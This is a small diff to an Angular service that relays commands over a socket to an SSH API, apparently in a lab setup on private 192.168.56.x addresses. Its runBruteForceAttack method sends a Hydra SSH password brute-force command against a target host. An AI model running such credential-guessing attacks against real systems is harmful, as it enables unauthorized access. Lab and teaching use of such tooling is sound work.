@@ -7,8 +7,9 @@ import {Observable} from 'rxjs/Observable';
 @Injectable()
 export class ApiSshService {
 
-  protected url: string = '192.168.56.101';
-  protected port: string = '8888';
+  protected urlAPISSH: string = '192.168.56.101';
+  protected urlCible: string = '192.168.56.102';
+  protected portSocket: string = '8888';
 
   socket: SocketIOClient.Socket = null;
 
@@ -16,7 +17,8 @@ export class ApiSshService {
   public shellAnswer;
 
   constructor() {
-    this.connectSocket('http://' + this.url + ':' + this.port);
+    //Ouverture d'un socket entre l'app et l'API SSH
+    this.connectSocket('http://' + this.urlAPISSH + ':' + this.portSocket);
     this.shellAnswer = new Observable(observer => {
       this.socket.on('data', function (data, res) {
         observer.next(data);
@@ -90,6 +92,6 @@ export class ApiSshService {
   }
 
   runBruteForceAttack() {
-    this.socket.emit('command', 'hydra -V -L username.txt -P password.txt 192.168.56.102 -t 4 ssh\r');
+    this.socket.emit('command', 'hydra -V -L username.txt -P password.txt ' + this.urlCible + ' -t 4 ssh\r');
   }
 }
